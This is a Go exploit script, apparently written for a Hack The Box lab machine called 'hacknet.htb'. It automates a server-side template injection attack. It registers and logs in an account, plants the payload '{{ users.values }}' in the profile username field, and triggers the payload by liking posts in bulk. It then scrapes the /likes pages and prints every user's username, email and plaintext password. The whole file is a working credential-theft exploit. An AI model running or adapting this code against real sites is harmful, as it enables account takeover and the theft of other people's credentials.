package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"html"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"sort"
	"strings"
	"sync"
	"time"
)

func getcsrfToken(client *http.Client, url string) string {
	resp, err := client.Get(url)
	if err != nil {
		log.Fatalf("creating the get csrf token request failed: %v", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatalf("failed to request the csrfmiddlewaretoken: %v", err)
	}

	// extract the csrfmiddlewaretoken
	re := regexp.MustCompile(`name="csrfmiddlewaretoken"\s+value="([^"]+)"`)
	matches := re.FindSubmatch(body)
	if len(matches) < 2 {
		log.Fatal("csrfmiddlewaretoken not found")
	}
	csrfToken := string(matches[1])

	return csrfToken
}

func createAccount(client *http.Client, endpoint, email, username, password string) {
	// get the csrf token
	csrfToken := getcsrfToken(client, endpoint)

	// build the form for the register account request
	form := url.Values{}
	form.Set("csrfmiddlewaretoken", csrfToken)
	form.Set("email", email)
	form.Set("username", username)
	form.Set("password", password)

	fmt.Println("[*] Registering a new account.")
	fmt.Println("Email:", email)
	fmt.Println("Username:", username)
	fmt.Println("Password:", password)

	// create the post request
	req, err := http.NewRequest("POST", endpoint, strings.NewReader(form.Encode()))
	if err != nil {
		log.Fatal("failed to create the register post request")
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Referer", endpoint)

	// send the request, i.e. register a new account
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal("failed to register a new account")
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatal("failed to read the response body when creating a new account")
	}

	if resp.StatusCode == http.StatusOK && !strings.Contains(string(body), "The username or email address is already in use") {
		fmt.Println("[+] Account created.")
	} else {
		fmt.Println("[*] Account already exists.")
	}
}

func login(client *http.Client, endpoint, email, password string) {
	// get the csrf token
	csrfToken := getcsrfToken(client, endpoint)

	// build the form for the login request
	form := url.Values{}
	form.Set("csrfmiddlewaretoken", csrfToken)
	form.Set("email", email)
	form.Set("password", password)

	// create the post request
	req, err := http.NewRequest("POST", endpoint, strings.NewReader(form.Encode()))
	if err != nil {
		log.Fatal("failed to create the login post request")
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Referer", endpoint)

	// send the request, i.e. login
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal("failed to login")
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatal("failed to read the response body after logging in")
	}

	if resp.StatusCode == http.StatusOK && strings.Contains(string(body), "/profile/edit") {
		fmt.Println("[+] Logged in.")
	} else {
		log.Fatal("failed to login")
	}
}

func injectPayload(client *http.Client, endpoint, payload string) {
	// get the csrf token
	csrfToken := getcsrfToken(client, endpoint)

	// build the form for the profile edit request
	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)

	// add an empty form file field for the profile picture
	_, err := writer.CreateFormFile("picture", "")
	if err != nil {
		log.Fatal("failed to create the empty form file field")
	}

	_ = writer.WriteField("csrfmiddlewaretoken", csrfToken)
	_ = writer.WriteField("email", "")
	// the SSTI payload goes into the username field
	_ = writer.WriteField("username", payload)
	_ = writer.WriteField("password", "")
	_ = writer.WriteField("about", "")
	_ = writer.WriteField("is_public", "on")
	_ = writer.WriteField("two_fa", "off")
	_ = writer.Close()

	// create the post request
	req, err := http.NewRequest("POST", endpoint, &buf)
	if err != nil {
		log.Fatal("failed to create the profile edit post request")
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())
	req.Header.Set("Referer", endpoint)

	// send the request, i.e. edit our profile and inject the SSTI payload
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal("failed to inject the SSTI payload")
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatal("failed to read the response body after injecting the SSTI payload")
	}

	data := string(body)
	if !strings.Contains(data, "Profile updated") {
		fmt.Println("something weird is going on, not fixing. reset the box at this point")
	}
}

func extractCredsFromHTML(raw string) []string {
	var objRe = regexp.MustCompile(`(?s)\{(.*?)\}`) // dot matches newline
	raw = html.UnescapeString(raw)
	matches := objRe.FindAllStringSubmatch(raw, -1)
	output := make([]string, 0, len(matches))

	for _, m := range matches {
		obj := m[1]
		// make it JSON-ish
		obj = strings.ReplaceAll(obj, "'", `"`)
		obj = strings.ReplaceAll(obj, "True", "true")
		obj = strings.ReplaceAll(obj, "False", "false")

		var data map[string]any

		if err := json.Unmarshal([]byte("{"+obj+"}"), &data); err != nil {
			continue
		}

		u, uok := data["username"]
		e, eok := data["email"]
		p, pok := data["password"]

		if !uok || !eok || !pok {
			continue
		}

		username := fmt.Sprintf("%v", u)
		email := fmt.Sprintf("%v", e)
		password := fmt.Sprintf("%v", p)
		output = append(output, fmt.Sprintf("User: %s | Email: %s | Password: %s", username, email, password))
	}
	return output
}

func triggerPayload(client *http.Client, baseURL string, minID, maxID int, wg *sync.WaitGroup) {
	for i := minID; i <= maxID; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			likeURL := fmt.Sprintf("%s/like/%d", baseURL, id)
			if resp, err := client.Get(likeURL); err == nil {
				io.ReadAll(resp.Body)
				defer resp.Body.Close()
			}
		}(i)
	}
	wg.Wait()
}

func getOutput(client *http.Client, baseURL string, minID, maxID int, wg *sync.WaitGroup) {
	credSet := make(map[string]struct{})
	var mu sync.Mutex

	for i := minID; i <= maxID; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			likesURL := fmt.Sprintf("%s/likes/%d", baseURL, id)
			resp, err := client.Get(likesURL)
			if err != nil {
				return
			}

			body, _ := io.ReadAll(resp.Body)
			defer resp.Body.Close()
			creds := extractCredsFromHTML(string(body))

			if len(creds) == 0 {
				return
			}

			mu.Lock()
			for _, c := range creds {
				credSet[c] = struct{}{}
			}
			mu.Unlock()
		}(i)
	}
	wg.Wait()

	if len(credSet) == 0 {
		fmt.Println("[-] No credentials found.")
		return
	}
	keys := make([]string, 0, len(credSet))
	for k := range credSet {
		keys = append(keys, k)
	}

	sort.Strings(keys)
	fmt.Println("== Leaked credentials ==")

	for _, k := range keys {
		fmt.Println(k)
	}
}

func main() {
	baseURL := "http://hacknet.htb"
	registerURL := baseURL + "/register"
	loginURL := baseURL + "/login"
	profileEditURL := baseURL + "/profile/edit"

	// create a cookie jar to hold our session cookies
	jar, err := cookiejar.New(nil)
	if err != nil {
		log.Fatal("failed to create the cookie jar")
	}

	// create an http client
	client := &http.Client{
		Jar:     jar,
		Timeout: 10 * time.Second,
	}

	// creds for the new account
	// if you run the script once and then change these creds and run it again, it will only work half the time, if at all
	// not gonna waste time fixing this, there's no point in running it multiple times with different credentials
	email := "pwned@lul.haha"
	username := "pwned"
	password := "asd"

	// run the logic for the first 50 posts
	const minID, maxID = 1, 100

	// create a new WaitGroup to wait for the goroutines to finish
	var wg sync.WaitGroup

	createAccount(client, registerURL, email, username, password)
	login(client, loginURL, email, password)

	// SSTI payload
	payload := "{{ users.values }}"
	injectPayload(client, profileEditURL, payload)
	fmt.Println("[+] Injected the payload.")

	// concurrently like every post between minID and maxID
	triggerPayload(client, baseURL, minID, maxID, &wg)

	// concurrently extract the credentials, i.e. username, password, email
	getOutput(client, baseURL, minID, maxID, &wg)

	// reset the payload so the script works everytime
	payload = "totally not malicious"
	injectPayload(client, profileEditURL, payload)
	triggerPayload(client, baseURL, minID, maxID, &wg) // this removes the likes, i.e. default state
}
